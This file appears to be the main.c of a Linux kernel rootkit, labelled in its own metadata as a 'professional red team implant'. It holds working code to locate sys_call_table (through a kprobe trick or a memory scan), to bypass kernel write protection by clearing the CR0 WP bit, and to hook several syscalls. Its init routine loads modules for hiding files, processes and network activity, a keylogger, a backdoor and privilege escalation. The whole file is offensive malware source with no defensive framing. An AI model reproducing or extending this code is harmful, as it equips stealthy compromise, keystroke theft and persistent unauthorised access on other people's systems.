/* vault_kernel - main.c
 * Kernel module entry/exit, sys_call_table discovery, WP bypass
 * ruby570bocadito © 2026
 */
#include "core.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR(VAULT_KERNEL_AUTHOR);
MODULE_VERSION(VAULT_KERNEL_VERSION);
MODULE_DESCRIPTION("vault_kernel kernel rootkit — professional red team implant");

unsigned long *sys_call_table = NULL;
int module_hidden = 0;

/* -- Syscall table hook entries -- */
struct hooked_syscall hooks[] = {
    { NULL, 0, 0, "__x64_sys_getdents64" },
    { NULL, 0, 0, "__x64_sys_getdents"   },
    { NULL, 0, 0, "__x64_sys_openat"     },
    { NULL, 0, 0, "__x64_sys_read"       },
    { NULL, 0, 0, "__x64_sys_kill"       },
    { NULL, 0, 0, "__x64_sys_write"      },
    { NULL, 0, 0, "__x64_sys_unlinkat"   },
};
int hooks_count = sizeof(hooks) / sizeof(hooks[0]);

/* Index lookup for hook slots */
#define HOOKIDX_GETDENTS64  0
#define HOOKIDX_GETDENTS    1
#define HOOKIDX_OPENAT      2
#define HOOKIDX_READ        3
#define HOOKIDX_KILL        4
#define HOOKIDX_WRITE       5
#define HOOKIDX_UNLINKAT    6

/* ================================================================
 * Syscall table discovery
 * ================================================================ */
unsigned long *find_sys_call_table(void) {
    unsigned long *table = NULL;
    unsigned long entry;
    unsigned long *scan;
    int i;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
    /*
     * Since 5.7, kallsyms_lookup_name is unexported.
     * We use a kprobe to call it anyway.
     */
    {
        struct kprobe kp;
        memset(&kp, 0, sizeof(kp));
        kp.symbol_name = "kallsyms_lookup_name";
        if (register_kprobe(&kp) == 0) {
            typedef unsigned long (*kln_t)(const char *);
            kln_t kln = (kln_t)kp.addr;
            table = (unsigned long *)kln("sys_call_table");
            unregister_kprobe(&kp);
            if (table && table != (unsigned long *)-ENOENT)
                goto found;
        }
    }
#else
    table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (table)
        goto found;
#endif

    /*
     * Fallback: scan kernel range near __x64_sys_close.
     * On x86_64, sys_call_table entries point to kernel functions
     * in the .text section. We scan backwards from __x64_sys_close
     * to find the table base.
     */
    {
        unsigned long sys_close_addr;
        unsigned long text_start;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
        {
            struct kprobe kp;
            memset(&kp, 0, sizeof(kp));
            kp.symbol_name = "kallsyms_lookup_name";
            if (register_kprobe(&kp) == 0) {
                typedef unsigned long (*kln_t)(const char *);
                kln_t kln = (kln_t)kp.addr;
                sys_close_addr = kln("__x64_sys_close");
                text_start = kln("_stext");
                unregister_kprobe(&kp);
            } else {
                sys_close_addr = 0;
                text_start = 0;
            }
        }
#else
        sys_close_addr = kallsyms_lookup_name("__x64_sys_close");
        text_start = kallsyms_lookup_name("_stext");
#endif

        if (sys_close_addr && text_start) {
            unsigned long page = sys_close_addr & PAGE_MASK;
            int offset;
            for (offset = -16; offset <= 0; offset++) {
                scan = (unsigned long *)(page + offset * PAGE_SIZE);
                for (i = 0; i < PAGE_SIZE / sizeof(unsigned long); i++) {
                    if (i > 2048) break;
                    entry = scan[i];
                    if (entry == sys_close_addr) {
                        table = &scan[i - __NR_close];
                        /* Validate two more entries point into kernel text */
                        if (scan[i - __NR_close + __NR_read] >= text_start &&
                            scan[i - __NR_close + __NR_write] >= text_start) {
                            goto found;
                        }
                    }
                }
            }
        }
    }

found:
    if (table) {
        pr_info(VAULT_KERNEL_TAG " sys_call_table @ 0x%px\n", table);
    } else {
        pr_err(VAULT_KERNEL_TAG " failed to locate sys_call_table\n");
    }
    return table;
}

/* ================================================================
 * Write-protection bypass (CR0 manipulation)
 * ================================================================ */
int disable_wp(void) {
    unsigned long cr0;
    cr0 = read_cr0();
    if (cr0 & X86_CR0_WP) {
        write_cr0(cr0 & ~X86_CR0_WP);
        return 1;
    }
    return 0;
}

void restore_wp(int saved) {
    if (saved) {
        unsigned long cr0 = read_cr0();
        write_cr0(cr0 | X86_CR0_WP);
    }
}

/* ================================================================
 * Hook installation
 * ================================================================ */
int install_hook(struct hooked_syscall *h) {
    int wp;

    if (!h->table_entry) {
        pr_err(VAULT_KERNEL_TAG " null table_entry for %s\n", h->name);
        return -EINVAL;
    }

    h->original = *h->table_entry;

    wp = disable_wp();
    *h->table_entry = h->hooked;
    restore_wp(wp);

    pr_info(VAULT_KERNEL_TAG " hooked %s (orig=0x%lx -> hook=0x%lx)\n",
            h->name, h->original, h->hooked);
    return 0;
}

void remove_hook(struct hooked_syscall *h) {
    int wp;

    if (!h->table_entry || !h->original)
        return;

    wp = disable_wp();
    *h->table_entry = h->original;
    restore_wp(wp);

    pr_info(VAULT_KERNEL_TAG " unhooked %s\n", h->name);
    h->table_entry = NULL;
    h->original = 0;
}

/* ================================================================
 * Module init / exit
 * ================================================================ */
static int __init vault_kernel_init(void) {
    int ret;

    pr_info(VAULT_KERNEL_TAG " loading v%s by %s\n",
            VAULT_KERNEL_VERSION, VAULT_KERNEL_AUTHOR);

    /* 1. Find sys_call_table */
    sys_call_table = find_sys_call_table();
    if (!sys_call_table) {
        pr_err(VAULT_KERNEL_TAG " cannot proceed without sys_call_table\n");
        return -ENODEV;
    }

    /* Map hook indices to syscall table entries */
    hooks[HOOKIDX_GETDENTS64].table_entry = &sys_call_table[__NR_getdents64];
    hooks[HOOKIDX_GETDENTS].table_entry   = &sys_call_table[__NR_getdents];
    hooks[HOOKIDX_OPENAT].table_entry     = &sys_call_table[__NR_openat];
    hooks[HOOKIDX_READ].table_entry       = &sys_call_table[__NR_read];
    hooks[HOOKIDX_KILL].table_entry       = &sys_call_table[__NR_kill];
    hooks[HOOKIDX_WRITE].table_entry      = &sys_call_table[__NR_write];
    hooks[HOOKIDX_UNLINKAT].table_entry   = &sys_call_table[__NR_unlinkat];

    /* 2. Init sub-modules */
    if ((ret = file_hide_init()))   goto err;
    if ((ret = proc_hide_init()))   goto err;
    if ((ret = net_hide_init()))    goto err;
    if ((ret = keylogger_init()))   goto err;
    if ((ret = backdoor_init()))    goto err;
    if ((ret = ioctl_init()))       goto err;
    if ((ret = stealth_init()))     goto err;

    /* 3. Install syscall hooks */
    if ((ret = hooking_init()))     goto err;

    pr_info(VAULT_KERNEL_TAG " loaded — hooks=%d, features: "
            "file_hide, proc_hide, net_hide, keylogger, backdoor, priv_esc, stealth\n",
            hooks_count);
    return 0;

err:
    pr_err(VAULT_KERNEL_TAG " init failed (ret=%d), cleaning up\n", ret);
    hooking_cleanup();
    ioctl_cleanup();
    backdoor_cleanup();
    keylogger_cleanup();
    net_hide_cleanup();
    proc_hide_cleanup();
    file_hide_cleanup();
    stealth_cleanup();
    return ret;
}

static void __exit vault_kernel_exit(void) {
    hooking_cleanup();
    ioctl_cleanup();
    backdoor_cleanup();
    keylogger_cleanup();
    net_hide_cleanup();
    proc_hide_cleanup();
    file_hide_cleanup();
    stealth_cleanup();

    pr_info(VAULT_KERNEL_TAG " unloaded\n");
}

/* ================================================================
 * Stub: hooked_write — passthrough (reserved for keylogger via tty)
 * ================================================================ */
asmlinkage long hooked_write(unsigned int fd, const char __user *buf,
                              size_t count) {
    long (*orig_write)(unsigned int, const char __user *, size_t);
    orig_write = (void *)hooks[HOOKIDX_WRITE].original;
    return orig_write(fd, buf, count);
}

module_init(vault_kernel_init);
module_exit(vault_kernel_exit);
